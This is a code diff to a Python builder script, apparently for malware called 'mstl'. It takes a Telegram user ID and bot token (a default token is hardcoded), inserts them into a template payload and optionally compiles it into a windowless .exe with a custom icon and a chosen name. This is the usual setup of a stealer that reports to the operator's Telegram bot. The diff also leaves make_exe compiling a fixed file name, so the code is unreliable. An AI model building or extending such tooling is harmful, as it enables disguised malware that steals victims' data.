@@ -71,30 +71,35 @@ MMM  M'  "MMM      "YMmMY"          MMM        ;;;;;YUMMM
     import os
     os.system('cls' if os.name == 'nt' else 'clear')
     print(Fore.CYAN + banners[randint(0, 3)])
-def make_python(ID, TOKEN):
+def make_python(ID, TOKEN, NAME):
     with open("builder/build.py", "r") as read: 
         text = read.readlines()
         text = "".join(text).replace("TELEGRAM_ID", ID).replace("BOT_TOKEN", f'"{TOKEN}"')
     system("mkdir output")
-    with open("output/mstl.py", "w") as write:
+    with open(f"output/{NAME}.py", "w") as write:
         write.write(text)
     print(Fore.GREEN + "File is created in /output directory.")
-def make_exe(): 
+def make_exe(NAME): 
     system("mkdir output/exe")
-    system("pyinstaller --onefile -i Files/icon.ico --noconsole --distpath output/exe output/mstl.py")
+    system(f"pyinstaller --name {NAME} --onefile -i Files/icon.ico --noconsole --distpath output/exe output/mstl.py")
     print(Fore.GREEN + ".exe application is created in /output/exe/mstl")
 banner()
 try: 
     id = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your telegram user id(with @userinfobot): "))
-    tok = str(input(Fore.GREEN + "[+]" + Fore.WHITE + "If you want to use custome token write C if not press enter: ")).lower()
+    tok = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use custome token write C if not press enter: ")).lower()
+    name = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use custome name write C if not press enter: ")).lower()
+    if name == "c": 
+        name = input("Write your app name(ex: mstl): ")
+    else: 
+        name = "mstl"
     if tok == "c":
         token = input("Write your bot token: ")
     else: 
         token = "6622962602:AAERgZlXugMGZIA5vqkIpv5KKAAsDUrA6is"
-    make_python(ID=id, TOKEN=token)
+    make_python(ID=id, TOKEN=token, NAME=name)
     opt = input(Fore.YELLOW + "Make it exe(Y for yes and N for no)? " + Fore.RESET).lower()
     if opt == "y": 
-        make_exe()
+        make_exe(NAME=name)
     else: 
         exit(Fore.CYAN + "\n\n Good Luck \n\n" + Fore.RESET)
 except ValueError: print(Fore.RED + "You must write str."), exit()
